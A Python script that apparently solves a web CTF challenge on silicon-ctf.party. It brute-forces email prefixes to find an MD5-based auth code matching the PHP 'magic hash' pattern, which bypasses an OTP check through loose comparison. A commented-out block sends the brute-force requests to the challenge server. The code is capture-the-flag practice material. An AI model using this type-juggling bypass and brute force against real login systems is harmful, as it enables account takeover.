import requests
import string
import itertools
import time
import re
import hashlib

# burp0_url = "https://challenges.silicon-ctf.party:443/web500/index.php"
# count=1
# # burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://challenges.silicon-ctf.party", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://challenges.silicon-ctf.party/web500/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
# for email in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(3))):
#     # if count % 5 == 0:
#     #     time.sleep(1)
#     # print(f"Trying: {email}@localhost.com")
#     burp0_data = {"uname": "admin", "otp": "0", "e":f"{email}@sith.com", "id":"1"}
#     res=requests.post(burp0_url, data=burp0_data)
#     if res.status_code != 200:
#         print('\nRan into error - may need to slow down')
#         break
#     if "Incorrect OTP" in res.text:
#         pos = res.text.find("authorization_code")
#         auth_code=res.text[pos+20:pos+30]
#         print(f'Attempt {email}@sith.com ... Try #{count} ... auth code {auth_code}', end="\r")

#         if re.match(r'0+[eE]\d+$', auth_code):
#             print(f'Attempt {email}@sith.com ... Try #{count} ... auth code {auth_code}\n')
#             break
#         count+=1

#     else:
#         print(f'\n[*] Found bypass with: {email}@sith.com')
#         with open('out.html','w') as f:
#             f.write(res.text)
#         break
    
count=1
for email in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(3))):
    temp='1' + '2fdde255d49fe7fc6f3323614bb55994c55db86142df93c2e4cb11570521fe54' + '1618288256' + email+'@galacticempire.com'
    auth_code=hashlib.md5(temp.encode()).hexdigest()[:10]
    # auth_code=
    if re.match(r'0+[eE]\d+$', auth_code):
        print(f'Attempt {email}@galacticempire.com ... Try #{count} ... auth code {auth_code}\n')
        break
    count+=1

# @empire - 490
# @empire.us - 502
# @imperial.com - 1052
# @galacticempire.com - 323